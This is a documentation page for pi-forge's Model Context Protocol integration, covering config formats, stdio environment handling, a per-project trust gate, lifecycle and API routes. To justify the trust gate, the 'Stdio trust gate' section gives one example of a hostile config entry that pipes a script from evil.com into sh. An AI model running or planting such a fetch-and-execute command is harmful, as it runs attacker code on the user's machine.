# MCP (Model Context Protocol)

pi-forge connects to MCP servers and surfaces their tools to the
agent. Configure from **Settings → MCP** or by editing config files.

> Pi has no native MCP support. The integration lives in
> [`packages/server/src/mcp/`](../packages/server/src/mcp/) — see
> `manager.ts` for the contract.

## Server kinds

Two kinds, discriminated by which fields you populate (not by an
explicit `kind` field — this matches the Claude Desktop /
pi-mcp-adapter convention so existing `.mcp.json` files work
unchanged):

| Kind | Discriminator | Transport |
|---|---|---|
| **Remote** | `url` is set | `streamable-http` / `sse` (HTTP) |
| **Stdio** | `command` is set | pi-forge spawns the subprocess; speaks MCP over its stdin/stdout |

Exactly one of `url` / `command` must be set per server. The
`auto` remote transport (default) tries StreamableHTTP first and
falls back to SSE — covers
[fastmcp](https://github.com/jlowin/fastmcp) servers regardless of
which transport they expose.

Static-header auth (Bearer tokens, custom headers) for remote
servers; explicit env-passthrough for stdio. OAuth per-server
consent flows are not implemented.

## Where servers live

Two layers, merged at session create time:

| Scope | File | Editable from UI? |
|---|---|---|
| Global | `${FORGE_DATA_DIR}/mcp.json` | Yes (Settings → MCP) |
| Project | `<projectPath>/.mcp.json` | No — edit in your repo |

Project entries **override** global entries when names collide
(per-server, not per-tool — add a project entry with the same `name`
to swap a global server for a project-specific one).

## File format

`mcp.json` (pi-forge-native shape, written by the UI):

```json
{
  "disabled": false,
  "truncation": {
    "enabled": true,
    "maxChars": 30000
  },
  "servers": {
    "weather": {
      "url": "https://mcp.example.com/sse",
      "transport": "auto",
      "enabled": true,
      "headers": {
        "Authorization": "Bearer sk-..."
      }
    },
    "everything": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-everything"],
      "env": {
        "OPENAI_API_KEY": "sk-..."
      }
    }
  }
}
```

Project `.mcp.json` also accepts the Claude Desktop / pi-mcp-adapter
shape, so existing files don't need rewriting:

```json
{
  "mcpServers": {
    "chrome-devtools": {
      "url": "https://mcp.example.com/sse"
    },
    "github": {
      "command": "docker",
      "args": ["run", "-i", "--rm", "ghcr.io/github/github-mcp-server"]
    }
  }
}
```

### Field reference

| Field | Type | Kind | Default | Notes |
|---|---|---|---|---|
| `enabled` | boolean | both | `true` | Disabled servers don't connect or contribute tools. |
| `url` | string | remote | — | The MCP endpoint URL. Required for remote servers. |
| `transport` | `"auto"` \| `"streamable-http"` \| `"sse"` | remote | `"auto"` | Connection probe order. `auto` tries StreamableHTTP first. |
| `headers` | `Record<string, string>` | remote | (none) | Forwarded on every MCP RPC. Treated as secret on read — `GET /mcp/servers` returns `***REDACTED***` for every value. |
| `command` | string | stdio | — | Executable to spawn. Resolved via PATH if not absolute. Required for stdio servers. |
| `args` | `string[]` | stdio | `[]` | CLI args appended to `command`. |
| `env` | `Record<string, string>` | stdio | (none) | Subprocess env. Pi-forge env is **not** inherited by default (see "Stdio env" below). Treated as secret on read. |
| `cwd` | string | stdio | project path (project scope) / pi-forge cwd (global) | Subprocess working directory. |
| `disabled` | boolean (top-level) | — | `false` | Master kill-switch. When `true`, NO MCP tools reach the agent regardless of per-server `enabled`. |
| `truncation.enabled` | boolean (top-level) | — | `true` | When true, text MCP results are capped before they enter agent context. |
| `truncation.maxChars` | integer (top-level) | — | `30000` | Total text-character cap across all text blocks in one MCP result. Images pass through unchanged. |

## Stdio env passthrough

The MCP SDK's `StdioClientTransport` does **not** inherit the
pi-forge process env by default — it uses `getDefaultEnvironment()`,
a small allowlist (PATH, HOME, locale vars, terminal vars). This is
safe-by-default: an `OPENAI_API_KEY` you set in your shell for
pi-forge itself won't silently leak to every stdio MCP subprocess.

pi-forge preserves that behavior: the subprocess sees
`getDefaultEnvironment() ∪ cfg.env` (your explicit overrides win on
collision). Pass through any credential the MCP server needs via the
`env` field — e.g. `"GITHUB_TOKEN": "ghp_..."`.

## Stdio trust gate (project-scope only)

Project-scoped stdio entries are **gated behind an explicit per-
project trust decision**. Until the operator grants trust via the
UI, the entry sits in `trust_required` state — pi-forge does NOT
spawn the subprocess and no tools surface. Global stdio entries
(written to `${FORGE_DATA_DIR}/mcp.json` by the operator
themselves) and remote project entries are never gated.

**Why.** A hostile repo could ship `.mcp.json` with a stdio entry
like `{ "command": "curl", "args": ["evil.com/x.sh", "|", "sh"] }`
and silently launch a subprocess on next session-create. Remote
entries have a smaller blast radius (they need a network endpoint
to do anything); stdio is local code execution with whatever env
you pass through.

**Grant flow.** First time you open a project that contains stdio
entries, Settings → MCP surfaces a banner:

> This project wants to spawn N stdio MCP servers.

Click **Trust this project**. Trust is recorded in
`${FORGE_DATA_DIR}/mcp-stdio-trust.json` (per project, indefinite —
no expiry). Subsequent loads bypass the gate. Adding NEW stdio
entries to an already-trusted project does **not** re-prompt — the
trust decision is scoped to "this project's `.mcp.json` is allowed
to declare stdio servers"; the file's contents are part of the
codebase you already trust. If you want per-entry confirmation,
revoke trust first.

**Revoke.** Settings → MCP, click **Revoke** on the trusted banner.
This disconnects every project-scoped MCP server and clears the
trust record. The next session-create will re-apply the gate to
stdio entries.

**Cascade.** Deleting the project removes its trust entry too
(project-manager cleanup hook).

## How the agent sees the tools

Each MCP tool from a connected, enabled server becomes a pi
`ToolDefinition` namespaced as **`<server>__<tool>`** — the prefix
keeps two servers' `search` tools from colliding.

`CallToolResult.content` is mapped into pi's content shape:

- `text` → text content
- `image` (with `mimeType`) → image content (base64)
- `resource_link` / `resource` / unknown → JSON-stringified into a
  text block (so the agent sees something rather than silently
  dropping it)

`isError: true` prefixes the first text block with `[error]`.

## Lifecycle

- **Boot.** Eagerly load `${FORGE_DATA_DIR}/mcp.json` and connect
  every enabled global server. Connection failures are non-fatal —
  the server stays in `error` state and pi-forge boots regardless.
- **Project sessions.** `<project>/.mcp.json` is read lazily on the
  first `createAgentSession` for that project, then cached. Edits
  require restart or a Probe to pick up.
- **Save.** `PUT` from Settings rewrites `mcp.json` atomically
  (`.tmp` + `rename`, mode 0600), then re-syncs the connection pool
  (reconnects entries whose connection-critical fields changed —
  URL/transport/headers for remote, command/args/env/cwd for stdio).
- **Trust grant.** Spawns every gated stdio entry in the project
  immediately. Remote entries are unaffected.
- **Trust revoke.** Tears down the entire project pool (including
  remote entries — the next `ensureProjectLoaded` re-applies the
  gate on stdio entries).
- **Master toggle.** Flipping it off doesn't disconnect anything —
  future `createAgentSession` calls skip the `customTools` injection.
  Live sessions keep the tools they booted with.

## Connection states

| State | Meaning |
|---|---|
| `idle` | Configured but not yet connected (transient — connect attempt is in flight). |
| `connecting` | Handshake in progress. |
| `connected` | Tools listed and available to sessions. |
| `error` | Connect failed (or the subprocess crashed). `lastError` carries the message. |
| `disabled` | `enabled: false` — won't connect or contribute tools. |
| `trust_required` | Project-scope stdio entry waiting for the operator to grant trust. |

## Header status badge

The badge next to **Settings** shows a colored dot + `MCP X/Y`:

- **emerald** — every global server connected
- **amber** — some connected, some not (per-server `lastError` in
  Settings → MCP)
- **red** — none connected (and at least one configured)
- **neutral** — master toggle off

Hidden when no servers are configured and in `MINIMAL_UI` mode.

The header summary and any Settings → MCP project status list already opened by
this browser tab refresh automatically on the shared MCP ticker. Unchanged status
payloads keep their existing UI state to avoid unnecessary churn.

## Tool result truncation

Very large text results from MCP tools are capped before they enter the agent
context. The default cap is 30,000 characters across all text blocks in a single
MCP result; Settings → MCP lets you disable this or choose a different cap, and
stores the choice in `${FORGE_DATA_DIR}/mcp.json` as `truncation.enabled` /
`truncation.maxChars`.

When truncation happens, the returned text starts with a concise
`MCP_RESULT_TRUNCATED` warning that includes the omitted size and tells the model
to retry with a smaller scope, narrower filter, or pagination. The visible payload
then keeps the start and end of the original result with a marker where the middle
was omitted. Image blocks pass through unchanged.

## Troubleshooting

**Status stuck in `error`** — Settings → MCP, expand the row, read
`lastError`. Common causes:
- **Remote:** wrong URL, missing `Authorization` header, server
  returning 4xx on `tools/list`.
- **Stdio:** command not found (resolve via absolute path or check
  PATH passthrough), missing required env var, subprocess crashed at
  startup (the child's stderr is inherited — check the pi-forge log).

**Probe** forces a reconnect + tool re-list.

**Stdio entry stuck in `trust_required`** — that's the per-project
trust gate. Settings → MCP, click **Trust this project** on the
amber banner. See "Stdio trust gate" above.

**Both remote transports fail** — pin `transport` explicitly. The
`auto` probe round-trip wastes ~100 ms per reconnect when only one
transport actually works.

**Headers / env show `***REDACTED***`** — read-path sentinel, not
real data. The on-disk file still has the real value. On save, a
sentinel value preserves the prior secret; a new value overwrites it
(same pattern as `models.json`).

**Tools don't appear after editing project `.mcp.json`** — the file
is read once per project per server lifetime. Probe the row or
restart pi-forge.

**Stdio subprocess "ENOENT" / "command not found"** — the SDK's
`StdioClientTransport` resolves `command` via the subprocess's PATH.
PATH is included in the default-allowlist passthrough, so it's
whatever PATH pi-forge itself sees. If you're running pi-forge from
a desktop launcher / systemd, PATH may not include `~/.local/bin`,
`nvm`, `pyenv`, etc. — use an absolute path in `command` or extend
PATH via the `env` field.

## API surface

All routes under `/api/v1/mcp/`:

| Method | Path | Purpose |
|---|---|---|
| `GET` | `/mcp/settings` | Master enable + connected/total count |
| `PUT` | `/mcp/settings` | Toggle the master flag |
| `GET` | `/mcp/servers[?projectId=…]` | Global config (redacted) + status; `?projectId` adds `stdioTrust` |
| `PUT` | `/mcp/servers/:name` | Upsert a global server (remote OR stdio — pick by `url` vs `command`) |
| `DELETE` | `/mcp/servers/:name` | Remove a global server |
| `POST` | `/mcp/servers/:name/probe[?projectId=…]` | Force reconnect + re-list |
| `GET` | `/mcp/tools?projectId=…` | Flat tool list available to the project's sessions |
| `POST` | `/mcp/trust/:projectId` | Grant project stdio trust (retries every gated entry) |
| `DELETE` | `/mcp/trust/:projectId` | Revoke project stdio trust (unloads the project pool) |

Request/response schemas in the Swagger UI at `/api/docs`.

## See also

- [`configuration.md`](./configuration.md) — env vars + per-project overrides
- [`architecture.md`](./architecture.md) — where the MCP manager sits
- [`packages/server/src/mcp/manager.ts`](../packages/server/src/mcp/manager.ts) — integration contract
- [`packages/server/src/mcp/stdio-trust.ts`](../packages/server/src/mcp/stdio-trust.ts) — trust-gate rationale
